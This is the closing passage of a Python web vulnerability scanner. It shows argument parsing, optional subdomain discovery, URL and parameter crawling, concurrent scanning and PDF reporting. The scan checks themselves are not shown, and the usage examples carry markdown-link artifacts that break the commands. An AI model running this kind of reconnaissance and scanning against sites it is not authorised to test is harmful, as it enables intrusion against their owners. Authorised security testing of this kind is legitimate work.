            elements.append(Spacer(1, 16)) # More space between severity sections
    
    # If no vulnerabilities were found across all categories
    if not any(findings.values()):
        elements.append(Paragraph("No vulnerabilities found.", styles['Normal']))
    
    doc.build(elements) # Build the PDF document

def scan_single_url_task(url, params):
    """
    A wrapper function to instantiate EnhancedVulnerabilityScanner and run its scan method.
    This is designed to be used with ThreadPoolExecutor for concurrent URL scanning.
    """
    scanner = EnhancedVulnerabilityScanner(url)
    return scanner.scan(params)

def main():
    """Main function to parse arguments, orchestrate scanning, and generate reports."""
    print_banner() # Display the tool's banner

    # Configure argument parser with a detailed description and epilog
    parser = argparse.ArgumentParser(
        description="SiM0N Enhanced vuln-scanner: An advanced web vulnerability scanner with PDF reporting capabilities. It performs subdomain discovery, parameter mining, and checks for various common web vulnerabilities.",
        epilog="""
## 🧪 Usage Examples:

1.  **Basic Scan:**
    ```bash
    python simon.py -d [http://example.com](http://example.com)
    ```
    (Scans `http://example.com`, crawls to depth 1, saves report as `vulnerability_report.pdf`.)

2.  **Deep Scan with Custom Output:**
    ```bash
    python simon.py -d [https://mywebapp.net](https://mywebapp.net) -l 3 -o my_web_app_report.pdf
    ```
    (Scans `https://mywebapp.net`, crawls to depth 3, saves report as `my_web_app_report.pdf`.)

3.  **Scan with Subdomain Discovery and More Threads:**
    ```bash
    python simon.py -d [http://maincorp.com](http://maincorp.com) --subdomains --threads 20
    ```
    (Scans `http://maincorp.com` and its discovered subdomains, using 20 concurrent threads.)

4.  **Full-Blown Recon & Scan:**
    ```bash
    python simon.py -d [https://critical-system.org](https://critical-system.org) -l 2 -o full_scan_report.pdf --subdomains --threads 15
    ```
    (A comprehensive scan including subdomains, deeper crawling, and optimized threading.)
""",
        formatter_class=argparse.RawTextHelpFormatter # This line ensures epilog formatting is preserved
    )
    # Define command-line arguments
    parser.add_argument('-d', '--domain', required=True, help='Target website URL (e.g., http://example.com)')
    parser.add_argument('-l', '--level', type=int, default=1, help='Crawl depth level (default: 1)')
    parser.add_argument('-o', '--output', default="vulnerability_report.pdf", help='Output PDF file name')
    parser.add_argument('--subdomains', action='store_true', help='Enable subdomain discovery')
    parser.add_argument('--threads', type=int, default=10, help='Number of threads for scanning (default: 10)')
    args = parser.parse_args() # Parse arguments from the command line

    # Assign parsed arguments to variables
    target = args.domain
    level = args.level
    output_file = args.output
    enable_subdomains = args.subdomains
    threads = args.threads

    # Initialize a dictionary to store all findings categorized by severity
    all_findings = {'Critical': [], 'High': [], 'Medium': [], 'Low': []}

    try:
        # Step 1: Discover and check live domains (including subdomains if enabled)
        domains_to_scan = [target]
        if enable_subdomains:
            base_domain = urlparse(target).netloc
            if not base_domain: # Fallback if urlparse doesn't get netloc (e.g., if target is just a domain name)
                base_domain = target.split('/')[0]
            subdomains = discover_subdomains(base_domain)
            if subdomains:
                live_subdomains = check_live_domains(subdomains)
                domains_to_scan.extend(live_subdomains) # Add live subdomains to the list of targets

        # Step 2: Iterate through each discovered (and live) domain for scanning
        for domain in domains_to_scan:
            print(Fore.CYAN + f"\n[*] Scanning domain: {domain}")
            
            # Step 2a: Crawl URLs and extract parameters for the current domain
            print(Fore.CYAN + f"[*] Crawling up to level {level} ...")
            urls, params = crawl_urls(domain, level)
            print(Fore.CYAN + f"[*] Found {len(urls)} URLs and {len(params)} parameters to scan.")
            
            # Step 2b: Scan each found URL concurrently for vulnerabilities
            with ThreadPoolExecutor(max_workers=threads) as executor:
                # Map each URL to a scan task
                future_to_url = {executor.submit(scan_single_url_task, url, params): url for url in urls}
                # Use tqdm to show a progress bar for scanning URLs
                for future in tqdm(as_completed(future_to_url), total=len(urls), desc="Scanning URLs"):
                    url = future_to_url[future]
                    try:
                        findings = future.result() # Get the categorized findings from the scan task
                        # Extend the main all_findings dictionary with results from this URL
                        for severity in findings:
                            all_findings[severity].extend(findings[severity])
                    except Exception as e:
                        print(Fore.RED + f"[-] Error scanning {url}: {str(e)}")

    # Handle KeyboardInterrupt (Ctrl+C) for graceful exit and partial report generation
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Scan interrupted by user. Generating report for collected findings...")
        generate_report(output_file, all_findings) # Save report with current findings
        sys.exit(1) # Exit with an error code
    # Handle any other unexpected exceptions during the main execution flow
    except Exception as e:
        print(Fore.RED + f"\n[!] An unexpected error occurred: {str(e)}")
        logging.error(f"Critical error in main execution: {e}", exc_info=True)
        # Always attempt to generate a partial report even on unexpected errors
        generate_report(output_file, all_findings) 
        sys.exit(1) # Exit with an error code

    # If the scan completes successfully without interruption, generate the final report
    print(Fore.CYAN + f"\n[*] Generating final report: {output_file}")
    generate_report(output_file, all_findings)
    print(Fore.GREEN + "[+] Scan completed successfully. Report saved.")

if __name__ == "__main__":
    main()
